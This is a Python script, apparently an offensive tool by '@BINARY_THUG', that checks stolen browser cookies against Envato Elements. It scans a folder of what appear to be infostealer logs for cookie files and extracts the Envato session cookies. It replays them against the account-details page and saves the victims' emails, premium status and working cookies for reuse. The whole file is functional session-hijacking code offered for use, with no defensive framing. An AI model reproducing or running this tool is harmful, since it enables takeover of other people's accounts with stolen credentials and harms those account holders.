import requests
import requests
import re
from datetime import datetime
import os
import ctypes
from concurrent.futures import ThreadPoolExecutor
import threading
from latest_user_agents import get_random_user_agent
import easygui
import colorama
import sys
import urllib3
import re
colorama.init()
if os.path.exists(os.path.join(os.getcwd(),"Result")):
    pass
else:
    os.mkdir("Result")
class ENVATO:
    def __init__(self) -> None:
        self.invalids = 0
        self.valids = 0
        self.Total = 0
        self.glob_tr=True
    def print_stats(self, lin):
        while True:
            if self.glob_tr==False:
                break
            else:
                ctypes.windll.kernel32.SetConsoleTitleW(f"[EVENTO COOKIE CHECKER]--BY @BINARY_THUG|VALIDS:{self.valids}|INVALIDS:{self.invalids}|TOTAL LOGS FOLDER:{len(lin)}")
    def Path(self, path):
        paths = []
        for root, dirs, files in os.walk(path):
            for dir in dirs:
                if dir in {'cookies', 'COOKIES', 'Cookie', 'Cookies', 'COOKIE'}:
                    paths.append(os.path.join(root, dir))
        return set(paths)
    def get_requ(self,cookies,lines,dt,fil):
        shad='https://account.elements.envato.com/account-details'
        cookies_str=";".join([f"{name}={value}" for name, value in cookies.items()])
        headers = {
    'Host': 'account.elements.envato.com',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive',
    'Referer': 'https://elements.envato.com/',
    'Cookie':cookies_str ,
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-site',
    'Sec-Fetch-User': '?1',
    'Pragma': 'no-cache',
    'Cache-Control': 'no-cache'
}
        txt=requests.get(shad,headers=headers,)
        pattern = r'"email"\s*:\s*"([^"]*)"'
        pattern_2 = r'"canNavigateToMySubscription"\s*:\s*(true|false)'
        match = re.search(pattern, txt.text)
        if match:
            print(colorama.Fore.GREEN+"[*] VALID"+colorama.Fore.RESET+" |"+colorama.Fore.BLUE+" COOKIES "+colorama.Fore.RESET+"|"+colorama.Fore.YELLOW+f" {fil} "+colorama.Fore.RESET+"|")
            email = match.group(1)
            matc_2 = re.search(pattern_2, txt.text)
            self.valids=self.valids+1
            ispremium= matc_2.group(1)
            out=os.path.join('Result',dt,f'{email}.txt')
            with open(out,mode='w',errors='ignore',encoding='utf-8') as aura:
                aura.write(f"\n====================================\nEMAIL:{email}\nIS_PREMIUM:{ispremium}\n====================================\n")
                for line in lines:
                    aura.write(line)
            
        else:
            print(colorama.Fore.RED+"[!] INVALID"+colorama.Fore.RESET+" |"+colorama.Fore.BLUE+" COOKIES "+colorama.Fore.RESET+"|"+colorama.Fore.YELLOW+f" {fil} "+colorama.Fore.RESET+"|")
            self.invalids=self.invalids+1
            return None
    def ui(self):
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW(f'EVENTO COOKIE CHECKER  - MADE BY @BINARY_THUG') 
        text = '''    
███████╗██╗   ██╗ █████╗ ███╗   ██╗████████╗ ██████╗      ██████╗ ██████╗ ██╗  ██╗██╗███████╗███████╗     ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗███████╗██████╗ 
██╔════╝██║   ██║██╔══██╗████╗  ██║╚══██╔══╝██╔═══██╗    ██╔════╝██╔═══██╗██║ ██╔╝██║██╔════╝██╔════╝    ██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝██╔════╝██╔══██╗
█████╗  ██║   ██║███████║██╔██╗ ██║   ██║   ██║   ██║    ██║     ██║   ██║█████╔╝ ██║█████╗  ███████╗    ██║     ███████║█████╗  ██║     █████╔╝ █████╗  ██████╔╝
██╔══╝  ╚██╗ ██╔╝██╔══██║██║╚██╗██║   ██║   ██║   ██║    ██║     ██║   ██║██╔═██╗ ██║██╔══╝  ╚════██║    ██║     ██╔══██║██╔══╝  ██║     ██╔═██╗ ██╔══╝  ██╔══██╗
███████╗ ╚████╔╝ ██║  ██║██║ ╚████║   ██║   ╚██████╔╝    ╚██████╗╚██████╔╝██║  ██╗██║███████╗███████║    ╚██████╗██║  ██║███████╗╚██████╗██║  ██╗███████╗██║  ██║
╚══════╝  ╚═══╝  ╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝      ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝     ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                                                                                                                                                                                                                                                                                                               
'''        
        faded = ''
        red = 20
        for line in text.splitlines():
            faded += (f"\033[38;2;{red};0;220m{line}\033[0m\n")
            if not red == 255:
                red += 15
                if red > 255:
                    red = 255
        print(self.center(faded))
        
    def net_to_cookie(self, filename, service):
        cookies = {}
        NF_line = []
        try:
            with open(filename, 'r', encoding='utf-8', errors='ignore') as fp:
                for line in fp:
                    try:
                        if not re.match('^\\#', line):
                            if service in line:
                                lineFields = line.strip().split('\t')
                                cookies[lineFields[5]] = lineFields[6]
                                NF_line.append(line)
                    except Exception:
                        continue
        except UnicodeDecodeError:
            with open(filename, 'r') as fp:
                for line in fp:
                    try:
                        if not re.match('^\\#', line):
                            if service in line:
                                lineFields = line.strip().split('\t')
                                cookies[lineFields[5]] = lineFields[6]
                                NF_line.append(line)
                    except Exception:
                        continue

        return cookies, NF_line
    def center(self, var: str, space: int = None):  # From Pycenter
        if not space:
            space = (os.get_terminal_size().columns - len(var.splitlines()[int(len(var.splitlines()) / 2)])) / 2
        return "\n".join((' ' * int(space)) + var for var in var.splitlines())
    def checker(self, path, datetime):
        for root, dirs, files in os.walk(path):
            for fil in files:
                if str(fil).endswith(".txt"):
                    full_path = os.path.join(root, fil)
                    cookie, NF_LINES = self.net_to_cookie(full_path, "envato")
                    if not cookie:
                        print(colorama.Fore.RED+"[*] INVALID"+colorama.Fore.RESET+" |"+colorama.Fore.BLUE+" COOKIES "+colorama.Fore.RESET+"|"+colorama.Fore.YELLOW+f" {fil} "+colorama.Fore.RESET+"|")
                        self.invalids += 1
                        continue
                    else:
                        self.get_requ(cookie,NF_LINES,datetime,fil)
    def print_horizontal_line(self,character='='):
        terminal_width = os.get_terminal_size().columns
        print(colorama.Fore.CYAN+character * terminal_width+colorama.Fore.RESET)
    def runner(self,logs_path,workers,datetime):
        print(colorama.Fore.CYAN+"LOADING MODULE")
        path_list=self.Path(path=logs_path)
        with ThreadPoolExecutor(max_workers=workers) as executor:
            for pat in path_list:
                try:
                    executor.submit(self.checker,pat,datetime)
                except:
                    continue 
            t=threading.Thread(target=self.print_stats,args=(path_list,))
            t.daemon=True
            t.start()
            os.system("cls")
            self.ui()
            executor.shutdown(wait=True)
            self.glob_tr=False
def datetimefolder(path):
    current_datetime = datetime.now().strftime("%m-%d-%y_%H-%M-%S")
    shia = os.path.join(path, current_datetime)
    os.mkdir(shia)
    return shia
#current = os.path.join(os.getcwd(), "Result")
#s = datetimefolder(current)
#E=ENVATO()
#E.checker(r"C:\Users\DELL\Desktop\EVATO\Cookie",s)
def maximize_console_window():
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 3)                
def main():
    os.system("cls")
    print(colorama.Fore.CYAN+"Wait Loading Model")
    maximize_console_window()
    os.system("cls")
    NF=ENVATO()
    NF.ui()
    print(f"""
          
          [{colorama.Fore.CYAN}Main Menu{colorama.Fore.RESET}]

    [{colorama.Fore.CYAN}1{colorama.Fore.RESET}] CHECKER

    [{colorama.Fore.CYAN}2{colorama.Fore.RESET}] Exit
    
    """)
    type=input(colorama.Fore.CYAN+"[*]"+colorama.Fore.RESET+"ENTER YOUR CHOICE:")
    if type=="1":
        os.system("cls")
        current = os.path.join(os.getcwd(), "Result")
        s = datetimefolder(current)
        logs_pathi=easygui.diropenbox(title="ENVANTO CHECKER- SELECT LOGS FOLDER")
        thread_num=input(colorama.Fore.RED+"[*]"+colorama.Fore.RESET+"ENTER THE THREADS:")
        while int(thread_num)>26:
            os.system("cls")
            print(colorama.Fore.GREEN+"[WARNING]"+colorama.Fore.YELLOW+"Only 25 threads are allowed"+colorama.Fore.RESET)
            thread_num=input(colorama.Fore.CYAN+"[*]"+colorama.Fore.RESET+"ENTER THE THREADS:")
            
        os.system("cls")
        print(colorama.Fore.GREEN+"[*]"+colorama.Fore.RESET+"THREADS LOADED ")
        print(colorama.Fore.GREEN+"[*]"+colorama.Fore.RESET+"PATH LOADED ")
        NF.runner(logs_pathi,int(thread_num),s)
        os.system("cls")
        NF.ui()
        NF.print_horizontal_line()
        print(NF.center(colorama.Fore.CYAN+"CHECKER BY @BINARY_THUG"))
        print(NF.center(colorama.Fore.GREEN+"CHECKER ENDED............"))
        print(NF.center(colorama.Fore.CYAN+"ENJOY YOUR ENVANTO COOKIES"+colorama.Fore.RESET))
        NF.print_horizontal_line()
        ctypes.windll.kernel32.SetConsoleTitleW(f"[ ENVANTO COOKIE CHECKER]--BY @BINARY_THUG |VALIDS:{NF.valids}|INVALIDS:{NF.invalids}|")
        print(f"""

    [{colorama.Fore.RESET}{colorama.Fore.CYAN}1{colorama.Fore.RESET}] CHECKER

    [{colorama.Fore.CYAN}2{colorama.Fore.RESET}] Exit""")
        t=input(colorama.Fore.CYAN+"[*]"+colorama.Fore.RESET+"ENTER YOUR CHOICE:")
        if t=="1":
            os.system("cls")
            main()
        elif t==2:
            os.system("cls")
            sys.exit()
        else:
            os.system("cls")
            sys.exit()
    elif type=="2":
        os.system("cls")
        sys.exit()
    else:
        os.system("cls")
        sys.exit()
        

        
        
main()
